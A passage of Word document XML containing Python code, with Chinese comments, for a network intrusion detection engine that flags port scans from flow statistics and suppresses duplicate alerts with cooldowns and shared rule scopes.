      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            store[key] = dq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127CB848">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            while len(store) &gt; self.max_scope:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D433A8D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                store.popitem(last=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292A2969">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089E15BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            store.move_to_end(key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64BFD8AC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self._trim(dq, cutoff)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3364BE93">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return dq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03878FBC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50514AF2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _should_report(self, scope: tuple, ts: float) -&gt; bool:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A44D85E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        last = self._fired.get(scope)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B9F5D0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if last is not None and ts - last &lt; self.cooldown:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6881BC86">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DED624D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self._fired[scope] = ts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21CDA0FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if len(self._fired) &gt; self.max_scope * 2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52CA74B3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            # 冷却表本身也要有上限，否则长跑之后只增不减</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3510E378">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            cutoff = ts - self.cooldown</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F887A30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self._fired = {k: v for k, v in self._fired.items() if v &gt;= cutoff}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71367B03">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267A64C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BC2D553">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _scope(self, probe_id: str, rule: str, src_key: str, dst_key: str) -&gt; tuple:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E3B5DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """去重域。同类判据共用一个域：一次 200 端口的扫描会同时命中 port_scan、</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB286BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        portscan_short、scan_single 三条规则，若每条各报一次，看板依然会被刷满。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2A31B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        kind = SCOPE_OF.get(rule, rule)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC53D2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return (probe_id, kind, src_key if kind == "scan" else dst_key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76984505">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35BC3D08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ---------------------------------------------------------------- 对外</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4193D0F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C4E5480">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def observe(self, probe_id: str, ts: float, flow_key: str, feats: Mapping[str, float]) -&gt; list[RuleHit]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3FA35C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """喂一条流，返回它触发的规则（已按去重域做冷却）。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="447F3AC4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        hits = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="114A5175">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        cutoff = ts - self.window</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D1A5943">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D9CBB7D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        parts = flow_key.split("|")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E750C7B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if len(parts) &lt; 5:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57200831">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return hits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4AADA3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        _proto, src_ip, _src_port, dst_ip, dst_port_raw = parts[:5]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="738F8D5A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53509B23">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            dst_port = int(dst_port_raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="741AA673">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        except ValueError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC88B30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            dst_port = -1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBA9AFF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52AD6859">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        src_key = f"{probe_id}|{src_ip}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33876D61">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        dst_key = f"{probe_id}|{dst_ip}|{dst_port}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D47E1E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="740820D0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        fwd = _num(feats, "Total Fwd Packets")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2794E64F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        bwd = _num(feats, "Total Backward Packets")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67EDE713">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        syn = _num(feats, "SYN Flag Count")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2A5251">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ack = _num(feats, "ACK Flag Count")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5896741C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="518285C3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 端口扫描：同一源、窗口内的**不同目的端口**数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F919EA0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        dq = self._bucket(self._src, src_key, cutoff)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6308FB05">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        dq.append((ts, dst_port, fwd))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27DDDB33">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ports = {p for (_t, p, f) in dq if f &lt;= self.port_scan_max_pkts}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="699AD2F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if len(ports) &gt;= self.port_scan_ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A8208ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if self._should_report(self._scope(probe_id, "port_scan", src_key, dst_key), ts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4556137C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                hits.append(RuleHit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F07D84">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "port_scan", "PortScan", float(len(ports)), float(self.port_scan_ports),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3187FA43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    f"源 {src_ip} 在 {self.window:g} 秒内探了 {len(ports)} 个不同目的端口",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033DFD3F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
